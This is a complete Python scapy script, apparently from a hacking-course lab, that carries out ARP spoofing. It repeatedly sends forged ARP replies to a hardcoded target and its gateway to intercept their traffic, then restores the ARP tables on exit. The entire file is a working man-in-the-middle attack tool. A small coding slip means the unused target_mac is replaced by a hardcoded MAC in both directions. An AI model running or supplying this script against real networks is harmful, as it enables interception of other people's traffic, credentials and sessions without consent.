#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

# ip and mac_address found with network_scanner.py
target_ip = "10.0.2.5"
mac_address = "08:00:27:08:72:ce"

#psrc Gateway/Passerelle found with 'route -n'
gateway_ip = "10.0.2.1"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwdst


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, hwsrc=source_mac, psrc=source_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected ctrl + C ... Resetting ARP tables .. Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
